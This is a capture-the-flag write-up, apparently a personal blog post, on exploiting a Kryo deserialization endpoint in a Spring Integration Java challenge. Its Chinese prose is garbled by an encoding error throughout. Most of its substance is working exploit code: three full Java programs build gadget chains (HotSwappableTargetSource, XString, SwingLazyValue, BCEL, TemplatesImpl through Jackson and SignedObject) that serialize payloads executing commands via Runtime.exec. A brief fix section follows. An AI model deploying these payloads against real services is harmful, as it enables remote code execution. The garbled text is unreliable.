---
layout: post
title: è¥¿å—èµ›åŒºjava
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.compu
---



```java
ç‡•å­ï¼Œæˆ‘ç»ˆäºæ¥äº†ï¼Œtnndæ—©å°±çœ‹ä¸Šäº†è¿™é“é¢˜ï¼Œç„¶åå­¦kryoå¤ç°coffeeå‘ç°éœ€è¦RASPï¼Œç„¶åå­¦RASPï¼Œå­¦å®Œå­¦Hessianï¼Œç„¶åæ‰æ¶¦æ¥ğŸ¤¢ï¼Œè®©ç‡•å­ä¹…ç­‰äº†
```

1. æç¤ºï¼šHessianåŸç”ŸJDKåˆ©ç”¨
2. Kryoååºåˆ—åŒ–

## è€è§„çŸ©è‡ªå·± åˆ†æä¸€æ³¢

```java
kryo 4.0.2  kryoåºåˆ—åŒ–æ¡†æ¶ï¼Œéœ€è¦å¯¹åºåˆ—/ååºåˆ—åŒ–çš„ç±»è¿›è¡Œæ³¨å†Œï¼Œé«˜ç‰ˆæœ¬è¿˜éœ€æœ‰æ— å‚æ„é€ ï¼Œé»˜è®¤FieldSerializeåºåˆ—åŒ–æ–¹å¼
snakeyaml-1.26
asm-5.0.4
```

è¯´å¥½çš„hessianåŸç”ŸJDKï¼Œæ²¡hessianä¾èµ–å‘€ã€‚ã€‚ã€‚

å…ˆçœ‹ç»™å‡ºçš„ç±»ï¼Œå®è´¨æ€§å°±äºŒä¸ªç±»ï¼Œä¸€ä¸ªjavabeanã€ä¸€ä¸ªcontroller

```java
public class MessageController {
    @RequestMapping({"/"})
    @ResponseBody
    public Object message(String message) throws Exception {
        byte[] decodemsg;
        if (message == null) {
            decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAHLyYj656nh3Rj89bSK7ufJrcoDAXRpbWVzdGFt8AnMwumxjGIBAWNvbS5zZWEuVXNl8gEBMbABc2VhY2xvdWTz");
        } else {
            try {
                decodemsg = Base64.getDecoder().decode(message);
            } catch (Exception e) {
                decodemsg = Base64.getDecoder().decode("ASsBAQIDAWnkAQBqYXZhLnV0aWwuVVVJxAGBw5uOyvHs1sGsg/nqhOyP9pIDAXRpbWVzdGFt8AnmifmxjGIBAWNvbS5zZWEuVXNl8gEBMbABZXJyb/I=");
            }
        }
        return new CodecMessageConverter(new MessageCodec()).toMessage(decodemsg, null).getPayload();
    }
}
```

ç»™çš„ä¹±ä¸ƒå…«ç³Ÿçš„ï¼Œäººå®¶ä¸éƒ½æ˜¯ç›´æ¥ç»™ååºåˆ—åŒ–ğŸï¼Œè¿™é‡Œå‘ƒå‘ƒå‘ƒï¼ˆéº»çƒ¦çš„æ˜¯ä¸€ä¸ªæ¥å£å¥—ä¸€ä¸ªæ¥å£ï¼‰

`ä½†ä¸æ˜¯æ‰€æœ‰javaé¢˜éƒ½æ˜¯è€ƒé“¾å­çš„ï¼ï¼ï¼`

![image-20231123200706815](..\img\final\image-20231123200706815.png)

codecæ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„new MessageCodec()ï¼Œè¿™é‡Œ this.codec.decode(å­—èŠ‚ç ï¼Œobjectç±»)

![image-20231123201114783](..\img\final\image-20231123201114783.png)

![image-20231123201222356](..\img\final\image-20231123201222356.png)

ç„¶åç»§ç»­è·Ÿè¿›decodeä¸­

![image-20231123201248345](..\img\final\image-20231123201248345.png)

![image-20231123201255921](..\img\final\image-20231123201255921.png)

è‡ªå·±è·Ÿè¿›å»æ‰¾åˆ°çš„ï¼Œåº”è¯¥ä¸æ˜¯å·§åˆå­ï¼Œå¦‚æœæ˜¯å·§åˆæˆ‘çœŸçš„######äº†

ä¸Šé¢å…¶å®ä¸ç”¨è°ƒè¯•ï¼Œè‚¯å®šæ˜¯ç›´æ¥åˆ°readobjectäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾é“¾å­äº†ï¼š

æ–¯å¥½tmç†Ÿæ‚‰å•Šï¼Œè¿™é‡Œhashmapæ— ç–‘äº†ï¼Œä¸Šä¸€é“é¢˜ç”¨çš„æ˜¯rome+signObjectäºŒæ¬¡ååºåˆ—åŒ–æå¾—ï¼Œå¯æ˜¯è¿™é“é¢˜æ²¡æœ‰romeä¾èµ–éš¾æ

![image-20231123201601071](..\img\final\image-20231123201601071.png)

### æ–¯çœ‹äº†çœ‹è¿™å‡ å¤©çš„ç¬”è®°ï¼Œä»¥åŠDubboé‚£ä¸ªCVE

```java
getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
write:270, MapSerializer (com.alibaba.fastjson.serializer)
write:44, MapSerializer (com.alibaba.fastjson.serializer)
write:280, JSONSerializer (com.alibaba.fastjson.serializer)
toJSONString:863, JSON (com.alibaba.fastjson)
toString:857, JSON (com.alibaba.fastjson)
    //ä¸Šé¢æ˜¯éœ€è¦fastjsonä¾èµ–çš„
    
    //ä¸‹é¢æ˜¯æˆ‘æœ‰çš„é“¾å­
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

æ‰€ä»¥æˆ‘ä»¬å½“å‰çš„é—®é¢˜å°±æ˜¯å¦‚ä½•æ‰¾åˆ°æŸä¸€ä¸ªç±»çš„#toStringæ–¹æ³•ç„¶åå‘½ä»¤æ‰§è¡Œ

æ—¢ç„¶æåˆ°äº†hessianåŸç”Ÿjdkè€Œæ²¡æœ‰ä¾èµ–ï¼Œå…«æˆæ˜¯ç”¨åˆ°äº†å…¶ä¸­çš„é“¾å­ï¼Œæˆ‘åœ¨è°ƒè¯•hessiané“¾å­çš„æ—¶å€™ä¹Ÿå‘ç°å¾ˆå¤šç±»ä¸éœ€è¦ç¬¬ä¸‰æ–¹åº“çš„ä¾èµ–

(`hessian`ä¸“æœ‰çš„åŒ…æ˜¯com.cachoï¼ŒtoStringæˆ‘çš„å¤©ç›´æ¥æ¬è¿)

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)

valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

è¿›è¡Œæ‹¼æ¥ä¸€ä¸‹

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)
 
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

æœç„¶æ˜¯è¿™æ ·å¥½å®Œ

![image-20231123205017944](..\img\final\image-20231123205017944.png)

```java
æ€è€ƒäº†ä¸€ä¸ªä¸œè¥¿ï¼šä¸Šæ¬¡å› ä¸ºæ˜¯kryo5.2ç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹æ³¨å†Œç­‰ç­‰ï¼Œä½†è¿™é“é¢˜æ˜¯4.2ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯falseæ‰€ä»¥ä¸éœ€è¦æ›´æ”¹ï¼Œæƒ³äº†åŠå¤©å’‹ç»•è¿‡çº¯è„‘ç˜«ğŸ˜¡ğŸ˜¡ğŸ˜¡ğŸ˜¡
```

å°±æ˜¯æ„é€ é“¾å­

```java
equals:392, XString (com.sun.org.apache.xpath.internal.objects)
equals:104, HotSwappableTargetSource (org.springframework.aop.target)
putVal:635, HashMap (java.util)
put:612, HashMap (java.util)
read:162, MapSerializer (com.esotericsoftware.kryo.serializers)
read:39, MapSerializer (com.esotericsoftware.kryo.serializers)
    readClassAndObject:813, Kryo (com.esotericsoftware.kryo)
readObject:136, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
readObject:147, KryoObjectInput (org.apache.dubbo.common.serialize.kryo)
decode:116, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
```

#### HotSwappableTargetSource.java

```java
  public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
    }
//ç›®çš„å¾ˆæ˜ç¡®ï¼Œtargetä¸ºXstringï¼Œåå°„èµ‹å€¼å³å¯   ä½†æ˜¯ï¼ï¼ï¼
 other instanceof HotSwappableTargetSource å¿…é¡»ç¬¦åˆè¿™ä¸ªä¸ºtrueï¼Œæ‰èƒ½æ‰§è¡Œåé¢çš„equalså‘€
 otheréœ€è¦æ˜¯HotSwappableTargetSourceç±»å‹ï¼Œä¸‹é¢Xstring.equals()çš„å‚æ•°å°±æ˜¯otherçš„targetå±æ€§
```

å¼å¼å¼ä¸æ„§æ˜¯æˆ‘å“ˆå“ˆå“ˆå“ˆ

```java
package com.sea;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class payload {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        setFieldValue(s,"attributes",uiDefaults);
        //sæ˜¯æœ€åçš„toString
        XString xstring=new XString("a");
//        xstring.equals(s);
        HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource("aa");
        HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource("aa");
        setFieldValue(hotSwappableTargetSource1,"target",xstring);
        setFieldValue(hotSwappableTargetSource2,"target",s);
        hotSwappableTargetSource1.equals(hotSwappableTargetSource2);
//        com.sun.org.apache.xpath.internal.objects.XString
//
//
//        equals:392, XString (com.sun.org.apache.xpath.internal.objects)
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![image-20231123210904016](..\img\final\image-20231123210904016.png)

æ¥ä¸‹æ¥åªéœ€è¦è®©hashmapè°ƒç”¨åˆ°å°±è¡Œäº†ï¼Œç„¶åååºåˆ—åŒ–è°ƒè¯•é€šå³å¯ï¼ˆ`å¯æ˜¯hashmapåˆåˆåˆå¿˜äº†é€»è¾‘äº†ï¼Œè¿™é‡Œå…ˆè¯•è¯•`)

```java
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node<K,V>[] tab; Node<K,V> p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node<K,V> e; K k;
            //pæ˜¯ä¸Šä¸€ä¸ªçš„hashï¼Œ
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;
```

æ¯æ¬¡éƒ½è¢«å¡è¿™é‡Œæœå•¦ï¼Œï¼ˆè¿™æ¬¡ä¸€å®šè¦å†™ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„è„šæœ¬ï¼‰

![image-20231123212032448](..\img\final\image-20231123212032448.png)

â€‹	è¿™ä¸ªæŠ¥é”™ç»™æˆ‘å¹²è’™è”½äº†ï¼ˆå¥‡æ€ªçš„æ˜¯åºåˆ—åŒ–ç«Ÿç„¶å¯ä»¥å¼¹è®¡ç®—å™¨ï¼‰

![image-20231123214546203](..\img\final\image-20231123214546203.png)

![image-20231123215152139](..\img\final\image-20231123215152139.png)

key  

```java
   HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa","2");
        map1.put("bB","1");
        map2.put("aa","1");
        map2.put("bB","2");
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");


```

```java
å¥½å¥½å¥½ï¼Œæ²¡æƒ³åˆ°å¡åœ¨è¿™ä¸€æ­¥æœäº† æ˜å¤©æå®šä½ tnndï¼Œå†å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬
```

#### hashmap#readobjectè¿›è¡Œåˆ†æ

æ‰§è¡Œkey.equals(k)çš„å‰ç½®æ¡ä»¶æ˜¯ï¼Œp.hash==hashï¼Œhashå°±æ˜¯è®¡ç®—keyé”®å€¼çš„hashcodeå€¼ï¼Œå¦‚æœkeyçš„å¯¹è±¡é‡å†™äº†hashcodeå°±ä¼šæ‰§è¡Œé‡å†™çš„å¦åˆ™å°±æ˜¯æ™®é€šçš„hashcodeï¼Œç„¶åå°±ä¼šæ‰§è¡Œequalsæ–¹æ³•ï¼Œä¹Ÿæ˜¯ å½“å‰key .equals(ä¸Šä¸€ä¸ªkey)

![image-20231124142424406](..\img\final\image-20231124142424406.png)

è¿˜æ˜¯è¿™ä¸ªæŠ¥é”™æˆ‘å°±ä¸ç†è§£äº†å‘€

![image-20231124143533163](..\img\final\image-20231124143533163.png)

### tnndå°±æ˜¯æ‰“ä¸é€šï¼Œä½†æ˜¯hessianä¸åªæ˜¯ä¸€æ¡åŸç”Ÿjdkæ¡é“¾å­å‘¢ï¼Œå¤©æ¶¯ä½•å¤„æ— èŠ³è‰ï¼Œåˆ«åœ¨ä¸€æ£µæ ‘ä¸ŠåŠæ­»ğŸ˜¡ğŸ˜¡ğŸ˜¡

```java
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:253, MimeTypeParameterList (javax.activation)
    
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

ç»§ç»­ç¼åˆä¸€ä¸‹

```java
HashMap#readObject
     HashMap#putVal
          HowSwappableTargetSource#equals
              XString#toString()
              
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:253, MimeTypeParameterList (javax.activation)
```

XStringä¸­çš„equalsæ–¹æ³•ä¼šè°ƒç”¨æŒ‡å®šç±»çš„

![image-20231124145327390](..\img\final\image-20231124145327390.png)

å’¦ï¼Œè«éæ²¡ç»§æ‰¿åºåˆ—åŒ–æ¥å£çš„ä¸èƒ½è¿™ä¹ˆå†™

![image-20231124153235192](..\img\final\image-20231124153235192.png)

### å‘ç°è‡ªå·±æ‰è¿›äº†ä¸€ä¸ªå¤§å‘

ä¸Šé¢çš„çº¯å±æ˜¯hashmapä¸æˆåŠŸå°±ä¸æˆåŠŸå‘—ï¼Œä½†åªè¦é¢˜ç›®çš„æµç¨‹å‘½ä»¤æ‰§è¡Œä¸å°±è¡Œäº†ï¼Œç›´æ¥æŠŠé¢˜ç›®çš„æŒªè¿‡æ¥è°ƒè¯•

![image-20231124162748362](..\img\final\image-20231124162748362.png)

é¦–å…ˆè¿™é‡Œæœ‰ä¸€ä¸ªè§£ç æ‰€ä»¥æˆ‘ä»¬å…ˆåŠ å¯†

![image-20231124162707556](..\img\final\image-20231124162707556.png)

`è¿™é‡Œå‘ç‚¹1ï¼šæŒ‡å®šäº†è§£å¯†çš„ç±»å‹ this.messageClass`ï¼Œæ‰€ä»¥æˆ‘ä»¬åŠ å¯†ä¹Ÿéœ€è¦ä»–

![image-20231124162828867](..\img\final\image-20231124162828867.png)

```java
GenericMessage message = new GenericMessage(hashMap);
MessageCodec messageCodec = new MessageCodec();
byte[] bytes = messageCodec.encode(message);
```

codecå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ï¼Œnew MessageCodec()ï¼Œæ‰€ä»¥å®ƒè§£å¯†å®ƒåŠ å¯†æ²¡æ¯›ç—…æŠŠ

![image-20231124163007721](..\img\final\image-20231124163007721.png)

```java
package com.sea;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.integration.codec.CodecMessageConverter;
import org.springframework.integration.codec.kryo.MessageCodec;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHeaders;
import org.springframework.messaging.support.GenericMessage;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;

public class ttt {
    public static void main(String[] args) throws Exception {

        UIDefaults uiDefaults = new UIDefaults();
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);
        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});
        uiDefaults.put("p4d0rn", slz);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        XString x = new XString("test");
        HashMap<Object, Object> hashMap = new HashMap<>();
        Object v1 = new HotSwappableTargetSource(mimeTypeParameterList);
        Object v2 = new HotSwappableTargetSource(x);

        setFieldValue(hashMap, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(hashMap, "table", tbl);

//        serialize(hashMap);
//        unserialize("ser.bin");

        GenericMessage message = new GenericMessage(hashMap);

        MessageCodec messageCodec = new MessageCodec();
        byte[] bytes = messageCodec.encode(message);
        System.out.println(new String(Base64.getEncoder().encode(bytes)));

        CodecMessageConverter codecMessageConverter = new CodecMessageConverter(new MessageCodec());
        Message<?> messagecode = codecMessageConverter.toMessage(bytes, (MessageHeaders) null);
        messagecode.getPayload();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        return objectInputStream.readObject();
    }
}
```

![image-20231124171644967](..\img\final\image-20231124171644967.png)



## æ°´æ–‡ç« çš„æ—¶å€™å‘ç°ä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•

æ˜¯é€šè¿‡jacksonæ–¹æ³•æ‰“çš„ï¼Œæ–¯é•¿åŸæ¯éƒ½æƒ³åˆ°äº† badattribute-->jackson#tostring---->getter

è¿™ä¸ªæ²¡æƒ³åˆ°ä¸åº”è¯¥å‘€ï¼Œè¿™é‡Œï¼ˆå…¥å£è‚¯å®šæ˜¯hashmapå› ä¸ºæ˜¯MapSerialize)

```java
package com.sea;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.*;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.integration.codec.CodecMessageConverter;
import org.springframework.integration.codec.kryo.MessageCodec;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHeaders;
import org.springframework.messaging.support.GenericMessage;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;


public class jackson {
    public static void main(String[] args) throws Exception {
        // äºŒæ¬¡ååºåˆ—åŒ– BadAttributeValueExpException -> POJONode -> TemplatesImpl
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
        
        CtClass ctClass = pool.makeClass("EvilGeneratedByJavassist");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        CtConstructor ctConstructor = CtNewConstructor.make("public EvilGeneratedByJavassist(){Runtime.getRuntime().exec(\"calc\");}", ctClass);
        ctClass.addConstructor(ctConstructor);
        byte[] byteCode = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "whatever");
        setFieldValue(templates, "_bytecodes", new byte[][]{byteCode});

        POJONode pojoNode1 = new POJONode(templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("whatever");
        setFieldValue(badAttributeValueExpException, "val", pojoNode1);

        // ä¸€æ¬¡ååºåˆ—åŒ– HotSwappableTargetSource -> XString -> POJONode -> SignedObject
        // åˆå§‹åŒ– SignedObject
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        // è®¾ç½®äºŒæ¬¡ååºåˆ—åŒ–å…¥å£
        SignedObject signedObject = new SignedObject(badAttributeValueExpException, privateKey, signingEngine);

        POJONode pojoNode2 = new POJONode(signedObject);
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(pojoNode2);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("whatever"));

        // æ‰‹åŠ¨æ„é€  HashMap ä»¥é˜²è§¦å‘æ­£å‘åˆ©ç”¨é“¾
        HashMap hashMap = new HashMap();
        setFieldValue(hashMap, "size", 2);
        Class nodeC;
        nodeC = Class.forName("java.util.HashMap$Node");
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, h1, "whatever", null));
        Array.set(tbl, 1, nodeCons.newInstance(0, h2, "whatever", null));
        setFieldValue(hashMap, "table", tbl);

        CodecMessageConverter codecMessageConverter = new CodecMessageConverter(new MessageCodec());
        // åºåˆ—åŒ–
        GenericMessage genericMessage = new GenericMessage(hashMap);
        byte[] decodemsg = (byte[]) codecMessageConverter.fromMessage(genericMessage, null);

        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), "UTF-8"));

        // ååºåˆ—åŒ–
        Message<?> messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders) null);
        //messagecode.getPayload();
    }

    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

```java
CodecMessageConverter
	-> toMessage(decodemsg, ...)
  	 this.codec.decode(decodemsg, ...)

AbstractKryoCodec
	-> decode(decodemsg, ...)

PojoCodec
	-> doDecode(...)

Kryo
	-> readObject(...)

MapSerializer
	-> read(...)
  	 Map#put(hotSwappableTargetSource, ...)

HotSwappableTargetSource
	-> equals(...)

XString
	-> equals(pojoNode)

BaseJsonNode
	-> toString()
  	 InternalNodeMapper#nodeToString(this)

SignedObject
	-> getObject()
  	 a.readObject()

BadAttributeValueExpException
	-> readObject()
  	 valObj.toString()

BaseJsonNode
	-> toString()
  	 InternalNodeMapper#nodeToString(this)

TemplatesImpl
	-> getOutputProperties()

...
```



# FIXé˜¶æ®µ

ä»£ç ä¸­æœ‰ä¸€ä¸ªæ²¡ç”¨çš„javabeanåªä½œä¸ºä¿¡æ¯çš„è¾“å‡ºã€‚

![image-20231124172234171](..\img\final\image-20231124172234171.png)

ç›´æ¥æ¬è·¯å¾„è¿™ä¹Ÿè¡Œï¼Ÿï¼Ÿï¼Ÿ

![image-20231124172241585](..\img\final\image-20231124172241585.png)

ç›´æ¥ç¦æ‰ï¼Œç”Ÿæˆå­—èŠ‚ç ä¸­çš„ç±»

![image-20231124180016774](..\img\final\image-20231124180016774.png)

å…³äºhashmapçš„é—®é¢˜ï¼Œä¼šè‡ªå·±å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« 
